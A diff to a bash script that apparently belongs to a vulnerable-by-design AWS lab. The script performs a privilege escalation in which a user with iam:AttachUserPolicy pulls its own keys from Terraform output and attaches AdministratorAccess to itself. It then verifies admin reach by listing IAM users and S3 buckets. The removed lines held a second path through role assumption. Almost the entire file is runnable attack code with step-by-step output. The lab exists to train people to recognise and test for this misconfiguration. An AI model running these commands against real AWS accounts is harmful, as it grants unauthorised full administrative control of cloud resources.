@@ -1,9 +1,12 @@
 #!/bin/bash
 
 # Demo script for iam:AttachUserPolicy privilege escalation
-# This script demonstrates how a principal with AttachUserPolicy permission can escalate to admin
+# This is a USER-BASED self-escalation scenario
 
 set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -12,162 +15,83 @@ YELLOW='\033[1;33m'
 NC='\033[0m' # No Color
 
 # Configuration
-PROFILE="pl-pathfinder-starting-user-prod"
-STARTING_USER="pl-pathfinder-starting-user-prod"
-PRIVESC_ROLE="pl-aup-adam"
-PRIVESC_USER="pl-aup-user"
+STARTING_USER="pl-prod-aup-to-admin-starting-user"
 MANAGED_POLICY_ARN="arn:aws:iam::aws:policy/AdministratorAccess"
 
 echo -e "${GREEN}========================================${NC}"
 echo -e "${GREEN}IAM AttachUserPolicy Privilege Escalation Demo${NC}"
-echo -e "${GREEN}========================================${NC}\n"
+echo -e "${GREEN}========================================${NC}"
+echo -e "${YELLOW}User-Based Self-Escalation${NC}\n"
 
-# Ask user which path to demonstrate
-echo -e "${YELLOW}Choose attack path:${NC}"
-echo "1. Role-based (assume pl-aup-adam role)"
-echo "2. User-based (use pl-aup-user credentials)"
-read -p "Enter choice (1 or 2): " choice
+# Step 1: Get credentials from Terraform output
+echo -e "${YELLOW}Step 1: Getting starting user credentials from Terraform${NC}"
+cd ../../../../../..  # Go to project root
 
-if [ "$choice" == "1" ]; then
-    # Role-based attack path
-    echo -e "\n${GREEN}Using role-based attack path${NC}\n"
+# Get the module output
+MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_self_escalation_to_admin_iam_attachuserpolicy.value // empty')
 
-    # Step 1: Verify starting user identity
-    echo -e "${YELLOW}Step 1: Verifying identity as starting user${NC}"
-    CURRENT_USER=$(aws sts get-caller-identity --profile $PROFILE --query 'Arn' --output text)
-    echo "Current identity: $CURRENT_USER"
-
-    if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
-        echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
-        echo "Please configure your AWS CLI profile '$PROFILE' to use the starting user credentials"
-        exit 1
-    fi
-    echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
-
-    # Step 2: Get account ID
-    echo -e "${YELLOW}Step 2: Getting account ID${NC}"
-    ACCOUNT_ID=$(aws sts get-caller-identity --profile $PROFILE --query 'Account' --output text)
-    echo "Account ID: $ACCOUNT_ID"
-    echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
-
-    # Step 3: Assume the privilege escalation role
-    echo -e "${YELLOW}Step 3: Assuming role $PRIVESC_ROLE${NC}"
-    ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${PRIVESC_ROLE}"
-    echo "Role ARN: $ROLE_ARN"
-
-    CREDENTIALS=$(aws sts assume-role \
-        --role-arn $ROLE_ARN \
-        --role-session-name demo-attack-session \
-        --profile $PROFILE \
-        --query 'Credentials' \
-        --output json)
-
-    export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
-    export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
-    export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
-
-    # Verify we're now the role
-    ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
-    echo "Current identity: $ROLE_IDENTITY"
-    echo -e "${GREEN}✓ Successfully assumed role${NC}\n"
-
-    # We'll attach the policy to the starting user (since we can't attach policies to assumed roles)
-    TARGET_USER=$STARTING_USER
-
-elif [ "$choice" == "2" ]; then
-    # User-based attack path
-    echo -e "\n${GREEN}Using user-based attack path${NC}"
-    echo -e "${YELLOW}Note: You need to configure the pl-aup-user credentials first${NC}\n"
-
-    # Get the user credentials from Terraform output
-    echo -e "${YELLOW}Step 1: Getting user credentials from Terraform output${NC}"
-    echo "Run these commands to get the credentials:"
-    echo "terraform output -raw prod_one_hop_to_admin_iam_attachuserpolicy[0].user_access_key_id"
-    echo "terraform output -raw prod_one_hop_to_admin_iam_attachuserpolicy[0].user_secret_access_key"
-    echo ""
-    read -p "Press enter once you have configured aws profile 'pl-aup-user' with these credentials..."
-
-    # Use the user credentials
-    export AWS_PROFILE="pl-aup-user"
-    TARGET_USER=$PRIVESC_USER
-
-    # Verify identity
-    echo -e "${YELLOW}Verifying identity as $PRIVESC_USER${NC}"
-    USER_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
-    echo "Current identity: $USER_IDENTITY"
-
-    if [[ ! $USER_IDENTITY == *"$PRIVESC_USER"* ]]; then
-        echo -e "${RED}Error: Not running as $PRIVESC_USER${NC}"
-        exit 1
-    fi
-    echo -e "${GREEN}✓ Verified user identity${NC}\n"
-
-    # Get account ID
-    ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
-    echo "Account ID: $ACCOUNT_ID"
-
-else
-    echo -e "${RED}Invalid choice${NC}"
+if [ -z "$MODULE_OUTPUT" ]; then
+    echo -e "${RED}Error: Could not find terraform output${NC}"
+    echo "Make sure you've deployed this scenario with: terraform apply"
     exit 1
 fi
 
-# Step 4: Check current permissions (should be limited)
-echo -e "${YELLOW}Step 4: Testing current permissions${NC}"
+# Extract credentials
+export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
+export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
+
+if [ "$AWS_ACCESS_KEY_ID" == "null" ] || [ -z "$AWS_ACCESS_KEY_ID" ]; then
+    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
+    exit 1
+fi
+
+echo -e "${GREEN}✓ Retrieved credentials for $STARTING_USER${NC}\n"
+
+cd - > /dev/null  # Return to scenario directory
+
+# Step 2: Verify identity
+echo -e "${YELLOW}Step 2: Verifying identity${NC}"
+CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
+echo "Current identity: $CURRENT_IDENTITY"
+
+if [[ ! $CURRENT_IDENTITY == *"$STARTING_USER"* ]]; then
+    echo -e "${RED}Error: Not running as expected user${NC}"
+    exit 1
+fi
+echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"
+
+# Step 3: Test current permissions (should be limited)
+echo -e "${YELLOW}Step 3: Testing current permissions${NC}"
 echo "Attempting to list IAM users (should fail)..."
 if aws iam list-users --max-items 1 2>&1 | grep -q "AccessDenied\|not authorized"; then
-    echo -e "${GREEN}✓ Confirmed limited permissions (cannot list IAM users)${NC}"
+    echo -e "${GREEN}✓ Confirmed limited permissions${NC}\n"
 else
-    echo -e "${YELLOW}Warning: Unexpected permissions${NC}"
+    echo -e "${YELLOW}⚠ Warning: Unexpected permissions${NC}\n"
 fi
-echo ""
 
-# Step 5: Perform privilege escalation via AttachUserPolicy
-echo -e "${YELLOW}Step 5: Escalating privileges via iam:AttachUserPolicy${NC}"
-echo "Attaching AdministratorAccess managed policy to user: $TARGET_USER"
-echo "This is the privilege escalation vector..."
+# Step 4: Perform privilege escalation
+echo -e "${YELLOW}Step 4: Escalating privileges via iam:AttachUserPolicy${NC}"
+echo "Attaching AdministratorAccess managed policy to self..."
 
-# Attach the managed policy to the user
 aws iam attach-user-policy \
-    --user-name $TARGET_USER \
+    --user-name $STARTING_USER \
     --policy-arn $MANAGED_POLICY_ARN
 
-echo -e "${GREEN}✓ Successfully attached AdministratorAccess managed policy!${NC}\n"
+echo -e "${GREEN}✓ Successfully attached AdministratorAccess policy!${NC}\n"
 
-# For role-based attack, we need to re-authenticate as the user to use the new policy
-if [ "$choice" == "1" ]; then
-    echo -e "${YELLOW}Step 6: Re-authenticating as the escalated user${NC}"
-    echo "Note: Since we attached the policy to the starting user, we need to switch back to that user"
-
-    # Clear the assumed role credentials
-    unset AWS_ACCESS_KEY_ID
-    unset AWS_SECRET_ACCESS_KEY
-    unset AWS_SESSION_TOKEN
-
-    # Use the original profile
-    export AWS_PROFILE=$PROFILE
-fi
-
-# Wait a moment for policy to propagate
-echo -e "${YELLOW}Waiting 5 seconds for policy changes to propagate...${NC}"
-sleep 5
+# Wait for policy to propagate
+echo -e "${YELLOW}Waiting 15 seconds for policy changes to propagate...${NC}"
+sleep 15
 echo ""
 
-# Step 7: Verify admin access
-echo -e "${YELLOW}Step 7: Verifying administrator access with escalated permissions${NC}"
-ESCALATED_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
-echo "Current identity: $ESCALATED_IDENTITY"
-
-# Test admin permissions
+# Step 5: Verify admin access
+echo -e "${YELLOW}Step 5: Verifying administrator access${NC}"
 echo "Testing admin permissions (listing IAM users)..."
-IAM_USERS=$(aws iam list-users --query 'Users[*].UserName' --output text | head -5)
-echo "Successfully listed IAM users: $IAM_USERS"
+IAM_USERS=$(aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text)
+echo -e "${GREEN}✓ Successfully listed IAM users: $IAM_USERS${NC}"
 
 echo "Testing S3 access..."
-if aws s3 ls 2>&1 | head -5; then
-    echo -e "${GREEN}✓ Can now list S3 buckets!${NC}"
-else
-    echo -e "${YELLOW}S3 listing still restricted (may need a moment for policy to propagate)${NC}"
-fi
+aws s3 ls | head -5 || echo -e "${YELLOW}(No buckets or still propagating)${NC}"
 
 echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"
 
@@ -175,29 +99,12 @@ echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"
 echo -e "${GREEN}========================================${NC}"
 echo -e "${GREEN}Attack Summary${NC}"
 echo -e "${GREEN}========================================${NC}"
-
-if [ "$choice" == "1" ]; then
-    echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
-    echo -e "Step 1: Assumed role ${YELLOW}$PRIVESC_ROLE${NC}"
-    echo -e "Step 2: Used AttachUserPolicy to attach AdministratorAccess to ${YELLOW}$STARTING_USER${NC}"
-    echo -e "Step 3: Switched back to ${YELLOW}$STARTING_USER${NC} with admin access"
-    echo ""
-    echo -e "${YELLOW}Attack Path:${NC}"
-    echo -e "  $STARTING_USER → (AssumeRole) → $PRIVESC_ROLE → (AttachUserPolicy) → $STARTING_USER → Admin"
-else
-    echo -e "Starting Point: User ${YELLOW}$PRIVESC_USER${NC}"
-    echo -e "Step 1: Used AttachUserPolicy to attach AdministratorAccess to self"
-    echo -e "Step 2: Gained ${RED}Administrator Access${NC}"
-    echo ""
-    echo -e "${YELLOW}Attack Path:${NC}"
-    echo -e "  $PRIVESC_USER → (AttachUserPolicy on self) → Admin"
-fi
-
+echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
+echo -e "Attack: Used ${YELLOW}iam:AttachUserPolicy${NC} to attach AdministratorAccess to self"
+echo -e "Result: ${GREEN}Administrator Access${NC}"
+echo ""
+echo -e "${YELLOW}Attack Path:${NC}"
+echo -e "  $STARTING_USER → (AttachUserPolicy on self) → Admin"
 echo ""
 echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to detach the managed policy${NC}"
-echo ""
-
-# Cleanup instructions
-echo -e "${YELLOW}To clean up:${NC}"
-echo "  ./cleanup_attack.sh"
 echo ""
